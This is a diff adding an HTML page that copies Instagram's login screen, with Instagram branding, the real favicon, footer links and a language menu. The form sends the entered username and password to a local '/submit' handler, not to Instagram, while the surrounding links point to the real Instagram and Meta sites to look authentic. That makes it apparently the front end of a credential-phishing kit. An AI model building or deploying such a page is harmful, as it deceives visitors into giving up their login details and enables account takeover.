@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <form action="/submit" method="post">
+                    <div class="input_field">
+                        <input type="text" name="username" placeholder="Phone number, username, or email" class="input" required>
+                    </div>
+                    <div class="input_field">
+                        <input type="password" name="password" placeholder="Password" class="input" required>
+                    </div>
+                    <div class="btn"><button type="submit">Log In</button></div>
+                </form>
+            </div>
+            <div class="or">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="images/facebook.png" alt="facebook">
+                    <a href="https://www.facebook.com/login.php">ㅤLog In with Facebook</a>
+                </div>
+                <div class="forgot">
+                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+        </div>
+        <div class="apps">
+            <p>Get the app.</p>
+            <div class="icons">
+                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images/appstore.png" alt="appstore"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/googleplay.png" alt="googleplay"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="https://about.meta.com/">Meta</a></li>
+                <li><a href="https://about.instagram.com/">About</a></li>
+                <li><a href="https://about.instagram.com/blog">Blog</a></li>
+                <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
+                <li><a href="https://help.instagram.com/">Help</a></li>
+                <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
+                <li><a href="https://privacycenter.instagram.com/">Privacy</a></li>
+                <li><a href="https://www.instagram.com/privacy/cookie_settings/">Cookie Settings</a></li>
+                <li><a href="https://help.instagram.com/581066165581870/">Terms</a></li>
+                <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
+                <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
+                <li><a href="https://www.threads.net/">Threads</a></li>
+                <li><a href="https://www.facebook.com/help/instagram/261704639352628">Data Policy</a></li>
+                <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="languages">
+        <select name="languages" id="languages">
+            <option value="tr.html">Türkçe</option>
+            <option value="ar.html">العربية</option>
+            <option value="cs.html">Čeština</option>
+            <option value="da.html">Dansk</option>
+            <option value="de.html">Deutsch</option>
+            <option value="el.html">Ελληνικά</option>
+            <option value="af.html">Afrikaans</option>
+            <option value="en-uk.html">English (UK)</option>
+            <option value="es-es.html">Español (España)</option>
+            <option value="es.html">Español</option>
+            <option value="fa.html">فارسی</option>
+            <option value="fi.html">Suomi</option>
+            <option value="fr.html">Français</option>
+            <option value="he.html">עברית</option>
+            <option value="id.html">Bahasa Indonesia</option>
+            <option value="no.html">Norsk</option>
+            <option value="nl.html">Nederlands</option>
+            <option value="pl.html">Polski</option>
+            <option value="ru.html">Русский</option>
+            <option value="sv.html">Svenska</option>
+            <option value="fil.html">Filipino</option>
+            <option value="tr.html">English</option>
+            <option value="zh-cn.html">中文(简体)</option>
+            <option value="gu.html">ગુજરાતી</option>
+            <option value="hr.html">Hrvatski</option>
+            <option value="fr-ca.html">Français (Canada)</option>
+            <option value="ro.html">Română</option>
+            <option value="sr.html">Српски</option>
+        </select>
+    
+        <script>
+            document.getElementById('languages').addEventListener('change', function() {
+                var selectedLanguage = this.value;
+                window.location.href = selectedLanguage;
+            });
+        </script>
+                
+        <p id="cinsta">© 2024 Instagram from Meta</p>
+    </div>
+    
+</div>
+</body>
+</html>
